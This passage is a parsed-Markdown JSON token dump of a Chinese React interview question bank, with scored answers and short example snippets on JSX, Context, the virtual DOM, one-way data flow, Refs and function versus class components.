是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.","escaped":false}]}]},{"type":"list_item","raw":"- 可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。\\n\\n","task":false,"loose":true,"text":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。\\n","tokens":[{"type":"text","raw":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。\\n","text":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。","tokens":[{"type":"text","raw":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。","text":"可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。","escaped":false}]}]},{"type":"list_item","raw":"- 类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。\\n\\n","task":false,"loose":true,"text":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。\\n","tokens":[{"type":"text","raw":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。\\n","text":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。","tokens":[{"type":"text","raw":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。","text":"类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。","escaped":false}]}]},{"type":"list_item","raw":"- 表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。\\n\\n","task":false,"loose":true,"text":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。\\n","tokens":[{"type":"text","raw":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。\\n","text":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。","tokens":[{"type":"text","raw":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。","text":"表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。","escaped":false}]}]},{"type":"list_item","raw":"- 工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","task":false,"loose":true,"text":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","tokens":[{"type":"text","raw":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","text":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","tokens":[{"type":"text","raw":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","text":"工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React中的Context是什么？如何使用？\\n\\n","depth":2,"text":"React中的Context是什么？如何使用？","tokens":[{"type":"text","raw":"React中的Context是什么？如何使用？","text":"React中的Context是什么？如何使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** Context的创建和提供：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Context的创建和提供：","task":false,"loose":false,"text":"**1：** Context的创建和提供：","tokens":[{"type":"text","raw":"**1：** Context的创建和提供：","text":"**1：** Context的创建和提供：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Context的创建和提供：","text":" Context的创建和提供：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst ThemeContext = React.createContext(\'light\');\\n\\nfunction App() {\\n  return (\\n    <ThemeContext.Provider value=\\"dark\\">\\n      <ThemedButton />\\n    </ThemeContext.Provider>\\n  );\\n}\\n```","lang":"jsx","text":"const ThemeContext = React.createContext(\'light\');\\n\\nfunction App() {\\n  return (\\n    <ThemeContext.Provider value=\\"dark\\">\\n      <ThemedButton />\\n    </ThemeContext.Provider>\\n  );\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 在类组件中使用Context：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在类组件中使用Context：","task":false,"loose":false,"text":"**1：** 在类组件中使用Context：","tokens":[{"type":"text","raw":"**1：** 在类组件中使用Context：","text":"**1：** 在类组件中使用Context：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在类组件中使用Context：","text":" 在类组件中使用Context：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nclass ThemedButton extends React.Component {\\n  static contextType = ThemeContext;\\n  render() {\\n    return <Button theme={this.context} />;\\n  }\\n}\\n```","lang":"jsx","text":"class ThemedButton extends React.Component {\\n  static contextType = ThemeContext;\\n  render() {\\n    return <Button theme={this.context} />;\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 在函数组件中使用useContext：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在函数组件中使用useContext：","task":false,"loose":false,"text":"**1：** 在函数组件中使用useContext：","tokens":[{"type":"text","raw":"**1：** 在函数组件中使用useContext：","text":"**1：** 在函数组件中使用useContext：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在函数组件中使用useContext：","text":" 在函数组件中使用useContext：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nfunction ThemedButton() {\\n  const theme = useContext(ThemeContext);\\n  return <Button theme={theme} />;\\n}\\n```","lang":"jsx","text":"function ThemedButton() {\\n  const theme = useContext(ThemeContext);\\n  return <Button theme={theme} />;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** Context的注意事项：\\n  + 避免过度使用Context\\n  + Context值变化会导致所有消费组件重新渲染\\n  + 适合共享全局数据，如主题、用户信息等","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Context的注意事项：\\n  + 避免过度使用Context\\n  + Context值变化会导致所有消费组件重新渲染\\n  + 适合共享全局数据，如主题、用户信息等","task":false,"loose":false,"text":"**1：** Context的注意事项：\\n+ 避免过度使用Context\\n+ Context值变化会导致所有消费组件重新渲染\\n+ 适合共享全局数据，如主题、用户信息等","tokens":[{"type":"text","raw":"**1：** Context的注意事项：\\n","text":"**1：** Context的注意事项：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Context的注意事项：","text":" Context的注意事项：","escaped":false}]},{"type":"list","raw":"+ 避免过度使用Context\\n+ Context值变化会导致所有消费组件重新渲染\\n+ 适合共享全局数据，如主题、用户信息等","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 避免过度使用Context\\n","task":false,"loose":false,"text":"避免过度使用Context","tokens":[{"type":"text","raw":"避免过度使用Context","text":"避免过度使用Context","tokens":[{"type":"text","raw":"避免过度使用Context","text":"避免过度使用Context","escaped":false}]}]},{"type":"list_item","raw":"+ Context值变化会导致所有消费组件重新渲染\\n","task":false,"loose":false,"text":"Context值变化会导致所有消费组件重新渲染","tokens":[{"type":"text","raw":"Context值变化会导致所有消费组件重新渲染","text":"Context值变化会导致所有消费组件重新渲染","tokens":[{"type":"text","raw":"Context值变化会导致所有消费组件重新渲染","text":"Context值变化会导致所有消费组件重新渲染","escaped":false}]}]},{"type":"list_item","raw":"+ 适合共享全局数据，如主题、用户信息等","task":false,"loose":false,"text":"适合共享全局数据，如主题、用户信息等","tokens":[{"type":"text","raw":"适合共享全局数据，如主题、用户信息等","text":"适合共享全局数据，如主题、用户信息等","tokens":[{"type":"text","raw":"适合共享全局数据，如主题、用户信息等","text":"适合共享全局数据，如主题、用户信息等","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是虚拟 DOM？它是如何工作的？\\n\\n","depth":2,"text":"什么是虚拟 DOM？它是如何工作的？","tokens":[{"type":"text","raw":"什么是虚拟 DOM？它是如何工作的？","text":"什么是虚拟 DOM？它是如何工作的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。\\n\\n- 创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。\\n\\n- Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。\\n\\n- 批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。\\n\\n","task":false,"loose":true,"text":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。\\n","tokens":[{"type":"text","raw":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。\\n","text":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。","tokens":[{"type":"text","raw":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。","text":"虚拟 DOM 是一个轻量级的内存中的 DOM 树表示。React 使用虚拟 DOM 来提高性能，避免频繁的操作真实 DOM。","escaped":false}]}]},{"type":"list_item","raw":"- 创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。\\n\\n","task":false,"loose":true,"text":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。\\n","tokens":[{"type":"text","raw":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。\\n","text":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。","tokens":[{"type":"text","raw":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。","text":"创建虚拟 DOM：React 在内存中创建一个虚拟 DOM 树。","escaped":false}]}]},{"type":"list_item","raw":"- Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。\\n\\n","task":false,"loose":true,"text":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。\\n","tokens":[{"type":"text","raw":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。\\n","text":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。","tokens":[{"type":"text","raw":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。","text":"Diff 算法：当状态改变时，React 会比较新的虚拟 DOM 和旧的虚拟 DOM，找出差异（即最小的变更集合）。","escaped":false}]}]},{"type":"list_item","raw":"- 批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","task":false,"loose":true,"text":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","tokens":[{"type":"text","raw":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","text":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","tokens":[{"type":"text","raw":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","text":"批量更新：React 将这些差异批量应用到真实 DOM，减少 DOM 操作次数，提高性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React 中的单向数据流是什么意思？\\n\\n","depth":2,"text":"React 中的单向数据流是什么意思？","tokens":[{"type":"text","raw":"React 中的单向数据流是什么意思？","text":"React 中的单向数据流是什么意思？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。\\n\\n- 数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。\\n\\n- 易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。\\n\\n- 可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。\\n\\n","task":false,"loose":true,"text":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。\\n","tokens":[{"type":"text","raw":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。\\n","text":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。","tokens":[{"type":"text","raw":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。","text":"单向数据流 是 React 的核心设计理念之一。在单向数据流中，数据只能从父组件流向子组件，不能反向流动。这种方式使得数据流更加清晰和可控。","escaped":false}]}]},{"type":"list_item","raw":"- 数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。\\n\\n","task":false,"loose":true,"text":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。\\n","tokens":[{"type":"text","raw":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。\\n","text":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。","tokens":[{"type":"text","raw":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。","text":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。","escaped":false}]}]},{"type":"list_item","raw":"- 易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。\\n\\n","task":false,"loose":true,"text":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。\\n","tokens":[{"type":"text","raw":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。\\n","text":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。","tokens":[{"type":"text","raw":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。","text":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。","escaped":false}]}]},{"type":"list_item","raw":"- 可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","task":false,"loose":true,"text":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","tokens":[{"type":"text","raw":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","text":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","tokens":[{"type":"text","raw":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","text":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React中的Refs是什么？有哪些使用场景？\\n\\n","depth":2,"text":"React中的Refs是什么？有哪些使用场景？","tokens":[{"type":"text","raw":"React中的Refs是什么？有哪些使用场景？","text":"React中的Refs是什么？有哪些使用场景？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 创建和使用Refs：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 创建和使用Refs：","task":false,"loose":false,"text":"**1：** 创建和使用Refs：","tokens":[{"type":"text","raw":"**1：** 创建和使用Refs：","text":"**1：** 创建和使用Refs：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 创建和使用Refs：","text":" 创建和使用Refs：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nfunction TextInputWithFocusButton() {\\n  const inputRef = useRef(null);\\n\\n  const focusInput = () => {\\n    inputRef.current.focus();\\n  };\\n\\n  return (\\n    <>\\n      <input ref={inputRef} type=\\"text\\" />\\n      <button onClick={focusInput}>Focus Input</button>\\n    </>\\n  );\\n}\\n```","lang":"jsx","text":"function TextInputWithFocusButton() {\\n  const inputRef = useRef(null);\\n\\n  const focusInput = () => {\\n    inputRef.current.focus();\\n  };\\n\\n  return (\\n    <>\\n      <input ref={inputRef} type=\\"text\\" />\\n      <button onClick={focusInput}>Focus Input</button>\\n    </>\\n  );\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 转发Refs：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 转发Refs：","task":false,"loose":false,"text":"**1：** 转发Refs：","tokens":[{"type":"text","raw":"**1：** 转发Refs：","text":"**1：** 转发Refs：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 转发Refs：","text":" 转发Refs：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst FancyButton = React.forwardRef((props, ref) => (\\n  <button ref={ref} className=\\"fancy-button\\">\\n    {props.children}\\n  </button>\\n));\\n```","lang":"jsx","text":"const FancyButton = React.forwardRef((props, ref) => (\\n  <button ref={ref} className=\\"fancy-button\\">\\n    {props.children}\\n  </button>\\n));"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 常见使用场景：\\n  + 管理焦点、文本选择或媒体播放\\n  + 触发强制动画\\n  + 集成第三方DOM库\\n\\n- **1：** 使用注意事项：\\n  + 避免过度使用Refs\\n  + 不要用Refs来做可以通过声明式实现的事情\\n  + 在类组件中使用需要通过React.createRef()创建","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 常见使用场景：\\n  + 管理焦点、文本选择或媒体播放\\n  + 触发强制动画\\n  + 集成第三方DOM库\\n\\n","task":false,"loose":true,"text":"**1：** 常见使用场景：\\n+ 管理焦点、文本选择或媒体播放\\n+ 触发强制动画\\n+ 集成第三方DOM库\\n","tokens":[{"type":"text","raw":"**1：** 常见使用场景：\\n","text":"**1：** 常见使用场景：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 常见使用场景：","text":" 常见使用场景：","escaped":false}]},{"type":"list","raw":"+ 管理焦点、文本选择或媒体播放\\n+ 触发强制动画\\n+ 集成第三方DOM库\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 管理焦点、文本选择或媒体播放\\n","task":false,"loose":false,"text":"管理焦点、文本选择或媒体播放","tokens":[{"type":"text","raw":"管理焦点、文本选择或媒体播放","text":"管理焦点、文本选择或媒体播放","tokens":[{"type":"text","raw":"管理焦点、文本选择或媒体播放","text":"管理焦点、文本选择或媒体播放","escaped":false}]}]},{"type":"list_item","raw":"+ 触发强制动画\\n","task":false,"loose":false,"text":"触发强制动画","tokens":[{"type":"text","raw":"触发强制动画","text":"触发强制动画","tokens":[{"type":"text","raw":"触发强制动画","text":"触发强制动画","escaped":false}]}]},{"type":"list_item","raw":"+ 集成第三方DOM库","task":false,"loose":false,"text":"集成第三方DOM库","tokens":[{"type":"text","raw":"集成第三方DOM库","text":"集成第三方DOM库","tokens":[{"type":"text","raw":"集成第三方DOM库","text":"集成第三方DOM库","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用注意事项：\\n  + 避免过度使用Refs\\n  + 不要用Refs来做可以通过声明式实现的事情\\n  + 在类组件中使用需要通过React.createRef()创建","task":false,"loose":true,"text":"**1：** 使用注意事项：\\n+ 避免过度使用Refs\\n+ 不要用Refs来做可以通过声明式实现的事情\\n+ 在类组件中使用需要通过React.createRef()创建","tokens":[{"type":"text","raw":"**1：** 使用注意事项：\\n","text":"**1：** 使用注意事项：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用注意事项：","text":" 使用注意事项：","escaped":false}]},{"type":"list","raw":"+ 避免过度使用Refs\\n+ 不要用Refs来做可以通过声明式实现的事情\\n+ 在类组件中使用需要通过React.createRef()创建","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 避免过度使用Refs\\n","task":false,"loose":false,"text":"避免过度使用Refs","tokens":[{"type":"text","raw":"避免过度使用Refs","text":"避免过度使用Refs","tokens":[{"type":"text","raw":"避免过度使用Refs","text":"避免过度使用Refs","escaped":false}]}]},{"type":"list_item","raw":"+ 不要用Refs来做可以通过声明式实现的事情\\n","task":false,"loose":false,"text":"不要用Refs来做可以通过声明式实现的事情","tokens":[{"type":"text","raw":"不要用Refs来做可以通过声明式实现的事情","text":"不要用Refs来做可以通过声明式实现的事情","tokens":[{"type":"text","raw":"不要用Refs来做可以通过声明式实现的事情","text":"不要用Refs来做可以通过声明式实现的事情","escaped":false}]}]},{"type":"list_item","raw":"+ 在类组件中使用需要通过React.createRef()创建","task":false,"loose":false,"text":"在类组件中使用需要通过React.createRef()创建","tokens":[{"type":"text","raw":"在类组件中使用需要通过React.createRef()创建","text":"在类组件中使用需要通过React.createRef()创建","tokens":[{"type":"text","raw":"在类组件中使用需要通过React.createRef()创建","text":"在类组件中使用需要通过React.createRef()创建","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是函数组件和类组件？它们有什么区别？\\n\\n","depth":2,"text":"什么是函数组件和类组件？它们有什么区别？","tokens":[{"type":"text","raw":"什么是函数组件和类组件？它们有什么区别？","text":"什么是函数组件和类组件？它们有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 函数组件：\\n\\n- 定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。\\n\\n- 优点：代码更简洁，性能更好（因为没有类的开销）。\\n\\n- 限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。\\n\\n- 类组件：\\n\\n- 定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。\\n\\n- 优点：支持生命周期方法和状态管理，功能更强大。\\n\\n- 缺点：代码相对复杂，性能略逊于函数组件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 函数组件：\\n\\n","task":false,"loose":true,"text":"函数组件：\\n","tokens":[{"type":"text","raw":"函数组件：\\n","text":"函数组件：","tokens":[{"type":"text","raw":"函数组件：","text":"函数组件：","escaped":false}]}]},{"type":"list_item","raw":"- 定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。\\n\\n","task":false,"loose":true,"text":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。\\n","tokens":[{"type":"text","raw":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。\\n","text":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。","tokens":[{"type":"text","raw":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。","text":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。","escaped":false}]}]},{"type":"list_item","raw":"- 